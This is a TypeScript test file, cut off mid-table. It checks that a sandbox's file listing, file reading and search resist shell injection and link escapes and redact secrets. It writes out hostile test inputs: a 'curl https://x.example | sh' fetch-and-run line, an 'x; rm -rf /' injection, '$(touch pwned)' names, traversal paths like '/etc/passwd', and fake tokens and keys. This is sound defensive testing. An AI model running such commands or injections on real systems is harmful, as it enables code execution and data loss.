// The Files and Search tabs' reads. As with the review's, the scripts run in real bash against real git and real
// grep, in a folder that stands in for the sandbox: what matters is what they find, and that they write nothing.
import { execFileSync, spawn } from "node:child_process";
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { FakeAgent, FakeChat, FakeClock, FakeHelper, FakeMachines } from "@i-inc/core/testing";
import { describe, expect, it, vi } from "vitest";
import { redactLast, redactProse, redactText, redactTokens } from "../src/ahp/sanitize.ts";
import { createApp } from "../src/app.ts";
import {
  fileScript,
  isSearchQuery,
  MAX_FILE_HITS,
  MAX_HITS,
  MAX_QUERY,
  MAX_SEARCH_FILES,
  MAX_TREE,
  readSearch,
  readTree,
  searchScript,
  treeScript,
} from "../src/copy-files.ts";
import { sideOf } from "../src/copy-read.ts";
import { seedDemo } from "../src/demo.ts";
import { demoReview } from "../src/demo-review.ts";
import { machineScript, type RunScript } from "../src/harness.ts";
import { MachineNotRunning, queueFor } from "../src/machine-queue.ts";
import { defaultMachineSettings } from "../src/machines.ts";
import {
  ConversationReview,
  isReviewPath,
  type ReviewCopy,
  type ReviewPort,
  reviewPort,
} from "../src/review.ts";
import { holdsCredential, marker, redactFile, scanHistory, scanPatch } from "../src/ship-git.ts";

const NONCE = "0123456789abcdef";
const TOKEN = "ghp_abcdefghijklmnopqrstuvwxyz0123456789";
const env = { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" };
const git = (cwd: string, ...a: string[]) => execFileSync("git", a, { cwd, env, encoding: "utf8" }).trim();

const bash = (script: string) =>
  new Promise<{ code: number; output: string }>((resolve) => {
    const child = spawn("bash", ["-s"], { env, stdio: ["pipe", "pipe", "pipe"] });
    const out: Buffer[] = [];
    child.stdout.on("data", (c) => out.push(c));
    child.stderr.on("data", (c) => out.push(c));
    child.on("close", (code) => resolve({ code: code ?? 1, output: Buffer.concat(out).toString("utf8") }));
    child.stdin.end(script);
  });

/** A working copy with one commit on main, or (`project` false) a plain folder. */
function rig(project: boolean | "no-commit" = true) {
  const root = mkdtempSync(join(tmpdir(), "inc-files-"));
  const work = join(root, "work");
  const cwd = join(work, "conv-ab12cd34");
  mkdirSync(cwd, { recursive: true });
  const run: RunScript = async (_who, script) => bash(script.replaceAll("/home/employee/work", work));
  const copy: ReviewCopy = {
    employeeId: "ada",
    cwd: "/home/employee/work/conv-ab12cd34",
    base: project ? "main" : null,
  };
  const write = (p: string, t: string | Buffer) => {
    mkdirSync(join(cwd, p, ".."), { recursive: true });
    writeFileSync(join(cwd, p), t);
  };
  if (project === "no-commit") git(cwd, "init", "-q", "-b", "main");
  if (project === true) {
    git(cwd, "init", "-q", "-b", "main");
    write("keep.txt", "one\nThe Needle here\nthree\n");
    write("gone.txt", "needle in a file that goes\n");
    write(".gitignore", "ignored.txt\n");
    git(cwd, "add", "-A");
    git(cwd, "-c", "user.name=a", "-c", "user.email=a@example.invalid", "commit", "-q", "-m", "base");
    git(cwd, "update-ref", "refs/remotes/origin/main", "HEAD");
  }
  return { root, cwd, copy, port: reviewPort(run), write };
}

/** Everything in the copy's .git, by name, size and time: if git wrote anything, this differs. */
function fingerprint(dir: string): string {
  const out: string[] = [];
  const walk = (d: string) => {
    for (const name of readdirSync(d).sort()) {
      const p = join(d, name);
      const s = statSync(p);
      if (s.isDirectory()) walk(p);
      else out.push(`${p} ${s.size} ${s.mtimeMs}`);
    }
  };
  walk(dir);
  return out.join("\n");
}

describe("the file list", () => {
  it("still lists a tracked change beside a folder that became a link", async () => {
    const w = rig();
    w.write("d/a.txt", "one\n");
    w.write("auth.ts", "old\n");
    git(w.cwd, "add", "-A");
    git(w.cwd, "-c", "user.name=a", "-c", "user.email=a@example.invalid", "commit", "-q", "-m", "more");
    git(w.cwd, "update-ref", "refs/remotes/origin/main", "HEAD");
    w.write("auth.ts", "new\n");
    w.write("other/b.txt", "two\n");
    execFileSync("rm", ["-rf", join(w.cwd, "d")]);
    symlinkSync("other", join(w.cwd, "d"));
    const list = await w.port.list(w.copy);
    expect(list.files.map((f) => f.path)).toContain("auth.ts");
    expect(list.files.map((f) => f.path)).toContain("d/a.txt");
  });

  it("doesn't call a tracked link deleted because .gitignore covers it", async () => {
    const w = rig();
    symlinkSync("keep.txt", join(w.cwd, "tracked-link"));
    w.write(".gitignore", "ignored.txt\ntracked-link\n");
    git(w.cwd, "add", "-A", "-f");
    git(w.cwd, "-c", "user.name=a", "-c", "user.email=a@example.invalid", "commit", "-q", "-m", "more");
    git(w.cwd, "update-ref", "refs/remotes/origin/main", "HEAD");
    expect(git(w.cwd, "status", "--porcelain")).toBe("");
    expect((await w.port.list(w.copy)).files).toEqual([]);
  });

  it("still sees a tracked link change, go, or turn up where a file was", async () => {
    const w = rig();
    symlinkSync("keep.txt", join(w.cwd, "moved"));
    symlinkSync("keep.txt", join(w.cwd, "removed"));
    git(w.cwd, "add", "-A");
    git(w.cwd, "-c", "user.name=a", "-c", "user.email=a@example.invalid", "commit", "-q", "-m", "more");
    git(w.cwd, "update-ref", "refs/remotes/origin/main", "HEAD");
    execFileSync("rm", [join(w.cwd, "moved"), join(w.cwd, "removed"), join(w.cwd, "gone.txt")]);
    symlinkSync(".gitignore", join(w.cwd, "moved"));
    symlinkSync("keep.txt", join(w.cwd, "gone.txt"));
    symlinkSync("keep.txt", join(w.cwd, "fresh"));
    const list = await w.port.list(w.copy);
    expect(Object.fromEntries(list.files.map((f) => [f.path, f.status]))).toEqual({
      fresh: "added",
      "gone.txt": "type-changed",
      moved: "modified",
      removed: "deleted",
    });
    expect(list.partial).toBe(false);
  });

  it.skipIf(process.getuid?.() === 0)("says when a folder it can't enter may hold files", async () => {
    const w = rig();
    w.write("d/tracked.txt", "one\n");
    git(w.cwd, "add", "-A");
    git(w.cwd, "-c", "user.name=a", "-c", "user.email=a@example.invalid", "commit", "-q", "-m", "more");
    w.write("d/new.txt", "new\n");
    chmodSync(join(w.cwd, "d"), 0);
    const list = await w.port.tree(w.copy);
    chmodSync(join(w.cwd, "d"), 0o755);
    expect(list.partial).toBe(true);
    expect(list.paths).toContain("keep.txt");
  });

  it.skipIf(process.getuid?.() === 0)("doesn't mind a shut folder that .gitignore covers", async () => {
    const w = rig();
    w.write(".gitignore", "shut/\n");
    w.write("shut/x.txt", "x\n");
    chmodSync(join(w.cwd, "shut"), 0);
    const list = await w.port.tree(w.copy);
    chmodSync(join(w.cwd, "shut"), 0o755);
    expect(list.partial).toBe(false);
  });

  it("has what is tracked and what is new, and not what is ignored or has gone", async () => {
    const w = rig();
    w.write("src/new.ts", "x\n");
    w.write("ignored.txt", "x\n");
    w.write(".inc/image.png", "x\n");
    execFileSync("rm", [join(w.cwd, "gone.txt")]);
    expect(await w.port.tree(w.copy)).toEqual({
      present: true,
      paths: [".gitignore", "keep.txt", "src/new.ts"],
      skipped: 0,
      truncated: false,
      partial: false,
    });
  });

  it("isn't told what to hide by the copy's own index or excludes", async () => {
    const w = rig();
    w.write("hidden.txt", "x\n");
    writeFileSync(join(w.cwd, ".git/info/exclude"), "hidden.txt\n");
    git(w.cwd, "update-index", "--skip-worktree", "keep.txt");
    const { paths } = await w.port.tree(w.copy);
    expect(paths).toContain("hidden.txt");
    expect(paths).toContain("keep.txt");
  });

  it("walks a folder that is no repository, past .git and dependencies, and makes no repository", async () => {
    const w = rig(false);
    w.write("notes.md", "x\n");
    w.write("deep/er/a.txt", "x\n");
    w.write("node_modules/dep/index.js", "x\n");
    symlinkSync("notes.md", join(w.cwd, "link"));
    expect((await w.port.tree(w.copy)).paths).toEqual(["deep/er/a.txt", "link", "notes.md"]);
    expect(existsSync(join(w.cwd, ".git"))).toBe(false);
  });

  it("walks a repository with no commit the same way", async () => {
    const w = rig("no-commit");
    w.write("a.txt", "x\n");
    expect((await w.port.tree(w.copy)).paths).toEqual(["a.txt"]);
  });

  it("leaves out and counts a name that isn't safe, and takes a shell word as a name", async () => {
    const w = rig();
    w.write("new\nline.txt", "x\n");
    w.write(`-rf`, "x\n");
    w.write(`$(touch pwned).txt`, "x\n");
    w.write(`${TOKEN}.txt`, "x\n");
    w.write("_authToken=abcdefgh12345678.txt", "x\n");
    const t = await w.port.tree(w.copy);
    expect(t.skipped).toBe(4);
    expect(t.paths).toContain("$(touch pwned).txt");
    expect(existsSync(join(w.cwd, "pwned"))).toBe(false);
  });

  it("drops a nested repository's folder row without calling it unsafe", async () => {
    const w = rig();
    mkdirSync(join(w.cwd, "sub"));
    git(join(w.cwd, "sub"), "init", "-q");
    expect((await w.port.tree(w.copy)).skipped).toBe(0);
  });

  it("says when the list is cut", () => {
    const names = Array.from({ length: MAX_TREE + 1 }, (_, i) => `f${i}\0`).join("");
    const out = [
      marker(NONCE, "tracked-begin"),
      names,
      marker(NONCE, "tracked-end"),
      marker(NONCE, "gone-begin"),
      "",
      marker(NONCE, "gone-end"),
      marker(NONCE, "new-begin"),
      "",
      marker(NONCE, "new-end"),
      marker(NONCE, "done"),
    ].join("\n");
    const t = readTree(out, NONCE);
    expect(t.paths).toHaveLength(MAX_TREE);
    expect(t.truncated).toBe(true);
  });

  it("calls a dead script a failure, not an empty folder", () => {
    expect(() => readTree("@@fail the list could not be read\n", NONCE)).toThrow(/could not be read/);
  });

  it("says when the folder isn't there", async () => {
    const w = rig();
    execFileSync("rm", ["-rf", w.cwd]);
    expect((await w.port.tree(w.copy)).present).toBe(false);
  });

  it("refuses a nonce or a folder it can't trust", () => {
    const w = rig();
    expect(() => treeScript(w.copy, "x; rm -rf /")).toThrow(/nonce/);
    expect(() => treeScript({ ...w.copy, cwd: "/etc" }, NONCE)).toThrow(/safe folder/);
  });
});

describe("one file", () => {
  it("reads what is on disk, committed or not, with tokens redacted and lines kept", async () => {
    const w = rig();
    w.write("keep.txt", `a\n-----BEGIN PRIVATE KEY-----\nabc\ndef\n-----END PRIVATE KEY-----\n${TOKEN}\nb\n`);
    const side = await w.port.read(w.copy, "keep.txt");
    expect(side?.state).toBe("text");
    expect(side?.text).not.toContain(TOKEN);
    expect(side?.text).not.toContain("abc");
    expect(side?.text?.split("\n").indexOf("b")).toBe(6);
  });

  it("says what a file is when it can't be shown", async () => {
    const w = rig();
    w.write("bin", Buffer.from([1, 0, 2]));
    w.write("big", "x".repeat(1_000_001));
    mkdirSync(join(w.cwd, "dir"));
    execFileSync("mkfifo", [join(w.cwd, "pipe")]);
    expect((await w.port.read(w.copy, "bin"))?.state).toBe("binary");
    expect((await w.port.read(w.copy, "big"))?.state).toBe("too-big");
    expect((await w.port.read(w.copy, "dir"))?.state).toBe("other");
    expect((await w.port.read(w.copy, "pipe"))?.state).toBe("other");
    expect((await w.port.read(w.copy, "nothing"))?.state).toBe("none");
  });

  it("doesn't follow a link out of the copy, at the end of the path or on the way", async () => {
    const w = rig();
    const outside = join(w.root, "secret.txt");
    writeFileSync(outside, "outside\n");
    symlinkSync(outside, join(w.cwd, "out"));
    symlinkSync(w.root, join(w.cwd, "up"));
    expect(await w.port.read(w.copy, "out")).toEqual({ state: "outside" });
    expect(await w.port.read(w.copy, "up/secret.txt")).toEqual({ state: "outside" });
  });

  it("doesn't reach .git or .inc through a link to the folder", async () => {
    const w = rig();
    w.write(".inc/photo.txt", "private\n");
    symlinkSync(".git", join(w.cwd, "g"));
    symlinkSync(".inc", join(w.cwd, "i"));
    expect(await w.port.read(w.copy, "g/config")).toEqual({ state: "outside" });
    expect(await w.port.read(w.copy, "i/photo.txt")).toEqual({ state: "outside" });
  });

  it("doesn't reach a nested .git through a link either", async () => {
    const w = rig();
    w.write("sub/.git/config", "secret\n");
    symlinkSync("sub/.git", join(w.cwd, "d"));
    expect(await w.port.read(w.copy, "d/config")).toEqual({ state: "outside" });
  });

  it("shows a link that stays inside as its target", async () => {
    const w = rig();
    symlinkSync("keep.txt", join(w.cwd, "in"));
    expect(await w.port.read(w.copy, "in")).toEqual({ state: "link", text: "keep.txt" });
  });

  it("needs no repository", async () => {
    const w = rig(false);
    w.write("notes.md", "hello\n");
    expect(await w.port.read(w.copy, "notes.md")).toEqual({ state: "text", text: "hello\n" });
  });

  it("refuses a path that isn't a plain relative one", () => {
    const w = rig();
    for (const bad of ["/etc/passwd", "../x", "a/../b", "-x", ".git/config", ".inc/a.png", "a\0b"]) {
      expect(() => fileScript(w.copy, bad, NONCE)).toThrow(/not a path/);
    }
  });
});

describe("a search", () => {
  it("finds lines in tracked and new files, by path and line", async () => {
    const w = rig();
    w.write("src/new.ts", "first\nneedle\n");
    const r = await w.port.search(w.copy, "needle", false);
    expect(r.hits).toEqual([
      { path: "gone.txt", line: 1, text: "needle in a file that goes" },
      { path: "keep.txt", line: 2, text: "The Needle here" },
      { path: "src/new.ts", line: 2, text: "needle" },
    ]);
  });

  it("minds case when told to", async () => {
    const w = rig();
    expect((await w.port.search(w.copy, "Needle", true)).hits.map((h) => h.path)).toEqual(["keep.txt"]);
    expect((await w.port.search(w.copy, "needle", true)).hits.map((h) => h.path)).toEqual(["gone.txt"]);
  });

  it("sees what the file says now, not what the commit says", async () => {
    const w = rig();
    w.write("keep.txt", "changed\n");
    execFileSync("rm", [join(w.cwd, "gone.txt")]);
    expect((await w.port.search(w.copy, "needle", false)).hits).toEqual([]);
  });

  it("leaves out ignored files, binary files, .inc and links", async () => {
    const w = rig();
    w.write("ignored.txt", "needle\n");
    w.write("bin", Buffer.concat([Buffer.from("needle"), Buffer.from([0, 1])]));
    w.write(".inc/a.txt", "needle\n");
    symlinkSync(join(w.cwd, "keep.txt"), join(w.cwd, "link"));
    const paths = (await w.port.search(w.copy, "needle", false)).hits.map((h) => h.path);
    expect(paths).toEqual(["gone.txt", "keep.txt"]);
  });

  it("takes the query as words: never a flag, a pattern or a shell", async () => {
    const w = rig();
    w.write("odd.txt", "a.c\nabc\n--help\n'; touch pwned; '\n$(touch pwned)\n");
    const texts = async (q: string) => (await w.port.search(w.copy, q, false)).hits.map((h) => h.text);
    expect(await texts("a.c")).toEqual(["a.c"]);
    expect(await texts("--help")).toEqual(["--help"]);
    expect(await texts("'; touch pwned; '")).toEqual(["'; touch pwned; '"]);
    expect(await texts("$(touch pwned)")).toEqual(["$(touch pwned)"]);
    expect(existsSync(join(w.cwd, "pwned"))).toBe(false);
  });

  it("searches a folder with no repository with plain grep, and walks past .git and dependencies", async () => {
    const w = rig(false);
    w.write("notes.md", "one\nNeedle\n");
    w.write("node_modules/dep/index.js", "needle\n");
    w.write("bin", Buffer.concat([Buffer.from("needle"), Buffer.from([0, 1])]));
    const r = await w.port.search(w.copy, "needle", false);
    expect(r.hits).toEqual([{ path: "notes.md", line: 2, text: "Needle" }]);
    expect((await w.port.search(w.copy, "needle", true)).hits).toEqual([]);
    expect(existsSync(join(w.cwd, ".git"))).toBe(false);
  });

  it("finds a query that starts with a dash in plain grep too", async () => {
    const w = rig(false);
    w.write("notes.md", "--help\n");
    expect((await w.port.search(w.copy, "--help", false)).hits).toHaveLength(1);
  });

  it("shows a line as the viewer shows it, and a match in what was taken out is no match", async () => {
    const w = rig();
    w.write("cfg.txt", `key needle ${TOKEN}\n`);
    const shown = await w.port.search(w.copy, "key needle", false);
    expect(shown.hits).toContainEqual({ path: "cfg.txt", line: 1, text: "key needle [redacted]" });
    expect((await w.port.search(w.copy, TOKEN.slice(0, 12), false)).hits).toEqual([]);
  });

  it("gives away nothing about a secret by whether a guess at it matched", async () => {
    const w = rig();
    w.write("cfg.txt", `value ${TOKEN}\n`);
    w.write(".env", "API_KEY=hunter2hunter2\n");
    w.write("key.txt", "-----BEGIN PRIVATE KEY-----\nMIIabcdef\n-----END PRIVATE KEY-----\n");
    w.write("notes\x01.txt", "swordfish\n");
    const guess = (q: string) => w.port.search(w.copy, q, true);
    expect(await guess(TOKEN.slice(0, 8))).toEqual(await guess("ghp_zzzz"));
    expect(await guess("API_KEY=h")).toEqual(await guess("API_KEY=x"));
    expect(await guess("MIIabc")).toEqual(await guess("MIIabd"));
    expect(await guess("swordfish")).toEqual(await guess("swordfisk"));
  });

  it("doesn't find the letters of what redaction put in a line's place", async () => {
    const w = rig();
    w.write("cfg.txt", `x ${TOKEN} y\n`);
    for (const q of ["redacted", "edac", "[red"]) {
      expect((await w.port.search(w.copy, q, false)).hits, q).toEqual([]);
    }
  });

  it("can't differ from the viewer, however far a value sits from its label", async () => {
    const key = "wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY12";
    const shapes = [
      `aws_secret_access_key:\n  ${key}\n`,
      `aws_secret_access_key:\n\n\n\n${key}\n`,
      `Authorization: Bearer\n  ${key}\n`,
      `Authorization: Bearer\n${"\n".repeat(30)}${key}\n`,
      `Bearer\r\n\r\n\r\n${key}\r\n`,
      `_authToken =\n  ${key}\n`,
      `_authToken\n\n\n=\n\n\n${key}\n`,
      `machine h login joe password\n  ${key}\n`,
      `machine h login\nu\npassword\n${key}\n`,
      `${"x ".repeat(1500)}aws_secret_access_key:\n${key}\n`,
      `# -----BEGIN PRIVATE KEY-----\n# ${key}\n# -----END PRIVATE KEY-----\n`,
      `---- BEGIN SSH2 ENCRYPTED PRIVATE KEY ----\n${key}\n---- END SSH2 ENCRYPTED PRIVATE KEY ----\n`,
      `-----BEGIN PRIVATE KEY-----\nabc.def ghi\n${key}\n-----END PRIVATE KEY-----\n`,
    ];
    for (const text of shapes) {
      for (const project of [true, false]) {
        const w = rig(project);
        w.write("deploy.yaml", text);
        const seen = await w.port.read(w.copy, "deploy.yaml");
        const r = await w.port.search(w.copy, key.slice(0, 5), true);
        const fromViewer = seen?.text?.split("\n") ?? [];
        for (const h of r.hits) expect(fromViewer).toContain(h.text);
        expect(seen?.text ?? "", text).toSatisfy((t: string) => !t.includes(key) || r.hits.length > 0);
      }
    }
  });

  it("shows no key body in the viewer, whatever the lines around it look like", async () => {
    const body = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC";
    const shapes = [
      `# -----BEGIN PRIVATE KEY-----\n# ${body}\n# -----END PRIVATE KEY-----\nafter\n`,
      `// -----BEGIN RSA PRIVATE KEY-----\n// ${body}\n// -----END RSA PRIVATE KEY-----\nafter\n`,
      `-----BEGIN PRIVATE KEY-----\nabc.def ghi\n${body}\n-----END PRIVATE KEY-----\nafter\n`,
      `---- BEGIN SSH2 ENCRYPTED PRIVATE KEY ----\n${body}\n---- END SSH2 ENCRYPTED PRIVATE KEY ----\nafter\n`,
    ];
    for (const text of shapes) {
      const w = rig();
      w.write("k.txt", text);
      const seen = (await w.port.read(w.copy, "k.txt"))?.text ?? "";
      expect(seen, text).not.toContain(body);
      expect(seen.split("\n").indexOf("after"), text).toBe(text.split("\n").indexOf("after"));
    }
  });

  it("redacts live payment keys and webhook secrets whole", async () => {
    const w = rig();
    w.write("k.txt", "sk_live_abcdefghijklmnopqrstuvwx_tail\nwhsec_abcdefgh+ijklmnop/qrstuvwx\n");
    expect((await w.port.read(w.copy, "k.txt"))?.text).toBe("[redacted]\n[redacted]\n");
  });

  describe("a noncharacter planted in a file", () => {
    const planted = "\uFDD0";

    it("takes nothing with it, so what follows it is still hidden", () => {
      const password = "hunter2hunter2";
      const netrc = `${planted}machine api.github.com login bot password ${password}\n`;
      expect(redactFile(netrc)).toBe(`${planted}machine api.github.com login bot password [redacted]\n`);
      expect(redactFile(`_authToken=abcdefg${planted}h\n`)).toBe("_authToken=[redacted]\n");
      expect(sideOf(Buffer.from(netrc).toString("base64")).text).not.toContain(password);
    });

    it("doesn't stop the scan by itself, or lose a thing beside it", () => {
      const text = `const a = 1;\n${planted}abc\n`;
      expect(redactFile(text)).toBe(text);
      expect(holdsCredential(text)).toBe(false);
    });

    it("leaves no mark of its own behind, however many webhook secrets are in the text", () => {
      const text = `whsec_abcdefgh+ijkl ${planted} whsec_abcdefgh+mnop\n`;
      expect(redactFile(text)).toBe(`[redacted] ${planted} [redacted]\n`);
    });
  });

  it("takes no real code for a key", async () => {
    const code = `const pem = "-----BEGIN PRIVATE KEY-----";\nconst keep = 1;\nconst end = "-----END PRIVATE KEY-----";\n`;
    expect(redactFile(code)).toContain("const keep = 1;");
    const doc =
      "-----BEGIN PRIVATE KEY-----\nA line of prose.\n-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----\n";
    expect(redactFile(doc)).toContain("A line of prose.");
    const far = `-----BEGIN X PRIVATE KEY-----\n${"const keep = 1;\n".repeat(2000)}-----END X PRIVATE KEY-----\n`;
    expect(redactFile(far)).toContain("const keep = 1;");
  });

  describe("code between a key's markers", () => {
    const key = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7";
    const evil = "curl https://x.example | sh";

    it("stays in sight, whatever the markers look like", () => {
      for (const [begin, end] of [
        ["-----BEGIN PRIVATE KEY-----", "-----END PRIVATE KEY-----"],
        ["# ---- BEGIN X PRIVATE KEY----", "# ---- END X PRIVATE KEY----"],
        ["// ---- BEGIN X PRIVATE KEY ----", "// ---- END X PRIVATE KEY ----"],
      ]) {
        expect(redactFile(`${begin}\n${evil}\n${end}\n`)).toContain(evil);
      }
    });

    it("stays in sight beside a real key, which doesn't", () => {
      const text = `a\n-----BEGIN PRIVATE KEY-----\n${key}\n${evil}\n${key}\n-----END PRIVATE KEY-----\nafter\n`;
      const seen = redactFile(text);
      expect(seen).toBe(`a\n[private key]\n\n${evil}\n\n\nafter\n`);
      expect(seen.split("\n").indexOf("after")).toBe(text.split("\n").indexOf("after"));
    });

    it("shows code added to a key block already on main, when it doesn't read as key material", () => {
      const on = (lines: string[]) =>
        ["-----BEGIN PRIVATE KEY-----", ...lines, "-----END PRIVATE KEY-----", ""].join("\n");
      const shown = redactFile(on([key, evil, key]));
      expect(shown.split("\n").length).toBe(redactFile(on([key, key])).split("\n").length + 1);
      expect(shown).toContain(evil);
      expect(shown).not.toContain(key);
    });

    it("isn't a key without one, and a marker alone stops nothing main didn't", () => {
      const text = `// ---- BEGIN X PRIVATE KEY ----\n${evil}\n// ---- END X PRIVATE KEY ----\n`;
      expect(redactFile(text)).toBe(text);
      expect(holdsCredential(text)).toBe(false);
    });
  });

  describe("a key's lines in the forms a source file holds them", () => {
    const key = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7MIIEvQIBADANBgkqhk";
    const code = "curl https://x.example | sh";
    const block = (...lines: string[]) =>
      ["-----BEGIN PRIVATE KEY-----", ...lines, "-----END PRIVATE KEY-----", "after", ""].join("\n");

    it.each([
      ["a trailing backslash", `${key}\\`, "abc=="],
      ["a written-out newline", `${key}\\n\\`, "abc=="],
      ["a short line and a backslash", `${key}\\`, "abc==\\"],
      ["quotes and a comma", `"${key}",`, '"abc==",'],
      ["single quotes", `'${key}'`, "'abc=='"],
      ["a backtick", `\`${key}`, "abc==`;"],
      ["a concatenated string", `"${key}\\n" +`, '"abc==\\n";'],
      ["a commented quoted line", `# "${key}",`, "# abc=="],
      ["a prefix on the string", `b"${key}"`, "abc=="],
      ["words after the key", `${key} and more`, "abc=="],
    ])("takes them all with %s", (_, line, last) => {
      const text = block(line, line, last);
      const seen = redactFile(text);
      expect(seen).toBe(`[private key]\n\n\n\n\nafter\n`);
      expect(holdsCredential(text)).toBe(true);
    });

    it("takes them around code it leaves in sight, in as many lines", () => {
      const text = block(`"${key}",`, code, '"abc==",');
      expect(redactFile(text)).toBe(`[private key]\n\n${code}\n\n\nafter\n`);
    });

    it("isn't slowed by a line built to backtrack", () => {
      const at = performance.now();
      for (let i = 0; i < 50; i++) redactFile(block(`${"+".repeat(16_000)}.`));
      expect(performance.now() - at).toBeLessThan(2000);
    });
  });

  describe("what redactTokens hides, whatever a block's lines look like", () => {
    const k64 = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7MIIEvQIBADANBgk";
    const begin = "-----BEGIN PRIVATE KEY-----";
    const end = "-----END PRIVATE KEY-----";
    const block = (...lines: string[]) => [begin, ...lines, end, "after", ""].join("\n");
    /** What a line shows, placeholders aside. */
    const words = (line: string) => line.replaceAll("[private key]", "").replaceAll("[redacted]", "");
    /** Is every character of `shown` in `over`, in order? */
    const within = (shown: string, over: string) => {
      let at = 0;
      for (const c of shown) {
        at = over.indexOf(c, at) + 1;
        if (at === 0) return false;
      }
      return true;
    };
    const hiddenStaysHidden = (text: string) => {
      const plain = redactTokens(text, { keepLines: true }).split("\n");
      const seen = redactFile(text).split("\n");
      expect(seen.length).toBe(plain.length);
      for (const [i, line] of seen.entries()) {
        expect(within(words(line), words(plain[i] ?? "")), JSON.stringify({ text, line })).toBe(true);
      }
    };

    it.each([
      ["a last line with code after it", [k64, "abcdEFGH0123456789==; # last line"], "abcdEFGH0123456789"],
      ["an armor header it doesn't know", [k64, "Foo: s3cr3tValue0123456789"], "s3cr3tValue"],
      ["an armor header first", ["Key-Info: RSA,I3rRIGXUabcdefgh", k64], "I3rRIGXU"],
    ])("keeps %s hidden", (_, lines, secret) => {
      const text = block(...lines);
      expect(redactTokens(text)).not.toContain(secret);
      expect(redactFile(text)).not.toContain(secret);
      expect(redactFile(text).split("\n").length).toBe(text.split("\n").length);
      hiddenStaysHidden(text);
    });

    it("keeps a line glued to an end marker hidden", () => {
      const text = `${begin}\nabcdEFGH0123456789==${end}\nx\n${end}\n`;
      expect(redactFile(text)).not.toContain("abcdEFGH");
      hiddenStaysHidden(text);
    });

    it("keeps what lies behind a webhook secret hidden", () => {
      const jwt = "eyJhbGciOiJ.eyJzdWIiOiIx.c2lnbmF0dXJl";
      const text = `whsec_abcdefgh/${jwt} https://joe:whsec_abcdefgh+x@example.com/\n`;
      expect(redactFile(text)).not.toMatch(/eyJ|joe|c2ln/);
      hiddenStaysHidden(text);
    });

    it("keeps a value hidden when a live key is glued to its label", () => {
      const text = "sk_live_abcdefghijklmnopqrstsecret_key=wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY12\n";
      expect(redactFile(text)).not.toContain("wJalrXUtn");
      hiddenStaysHidden(text);
      const glued = "whsec_abcdefgh_secret_key = wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY12\n";
      expect(redactFile(glued)).not.toContain("wJalrXUtn");
      hiddenStaysHidden(glued);
    });

    it("takes a block's lines out of what redactTokens leaves, and no more than those", () => {
      const text = `# ${begin}\n# ${k64}\ncurl https://x.example | sh\n# ${k64}\n# ${end}\nafter\n`;
      expect(redactFile(text)).toBe("# [private key]\n\ncurl https://x.example | sh\n\n\nafter\n");
    });

    it("puts the mark in place of a marker it doesn't take itself", () => {
      const text = `const k = "---- BEGIN X PRIVATE KEY ----\\n" +\n  "${k64}\\n" +\n  "---- END X PRIVATE KEY ----";\n`;
      expect(redactTokens(text)).toBe(text);
      expect(redactFile(text)).toBe('const k = "[private key]\n\n";\n');
    });

    it("holds over a fuzz of blocks, tokens and code", () => {
      const pieces = [
        begin,
        end,
        `# ${begin}`,
        `# ${end}`,
        "---- BEGIN X PRIVATE KEY ----",
        "---- END X PRIVATE KEY ----",
        `"${begin}\\n" +`,
        `"${end}\\n"`,
        k64,
        `"${k64}\\n" +`,
        `# ${k64}`,
        "abc==",
        "abcdEFGH0123456789==; # last",
        "Foo: s3cr3tValue",
        "Comment: work",
        "curl https://x.example | sh",
        "const keep = 1;",
        `${k64}${end}`,
        "ghp_abcdefghijklmnopqrstuvwxyz0123456789",
        "eyJhbGciOiJ.eyJzdWIiOiIx.c2lnbmF0dXJl",
        "whsec_abcdefgh/eyJhbGciOiJ",
        "whsec_abcdefghijkl+x==",
        "whsec_abcdefgh_secret_key = wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY12",
        "sk_live_abcdefghijklmnopqrstsecret_key=wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY12",
        "sk_live_abcdefghijklmnop_tail",
        "https://joe:p4ssw0rd@example.com/",
        "postgres://joe:p4ss/w0rd@example.com/app",
        "mysql://root:p#ss@example.com",
        `https://joe:${"p".repeat(500)}@example.com/`,
        "foo_ghp_abcdefghijklmnopqrstuvwxyz0123456789",
        "x?token=abcdef",
        "Bearer",
        "",
      ];
      let x = 20_260_211;
      const pick = (n: number) => {
        x = (x * 1_103_515_245 + 12_345) & 0x7fffffff;
        return (x >>> 8) % n;
      };
      for (let i = 0; i < 20_000; i++) {
        const lines = Array.from({ length: 1 + pick(9) }, () => pieces[pick(pieces.length)]);
        const text = `${lines.join(pick(4) ? "\n" : "\r\n")}\n`;
        hiddenStaysHidden(text);
        if (redactTokens(text) !== text) expect(holdsCredential(text), text).toBe(true);
      }
    });
  });

  describe("a key in a string joined over several lines", () => {
    const key = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7MIIEvQIBADANBgk";
    const begin = "-----BEGIN PRIVATE KEY-----";
    const end = "-----END PRIVATE KEY-----";

    it.each([
      [
        "Go",
        `const key = "${begin}\\n" +\n\t"${key}\\n" +\n\t"${key}\\n" +\n\t"${end}\\n"\nconst keep = 1\n`,
      ],
      [
        "Python",
        `KEY = (\n    "${begin}\\n"\n    "${key}\\n"\n    "abc==\\n"\n    "${end}\\n"\n)\nkeep = 1\n`,
      ],
      [
        "a JS array",
        `const key = [\n  "${begin}",\n  "${key}",\n  "abc==",\n  "${end}",\n].join("\\n");\nconst keep = 1;\n`,
      ],
      ["a Go raw string", `const key = \`${begin}\n${key}\nabc==\n${end}\`\nconst keep = 1\n`],
      [
        "a commented string",
        `// k := "${begin}\\n" +\n//   "${key}\\n" +\n//   "${end}\\n"\nconst keep = 1\n`,
      ],
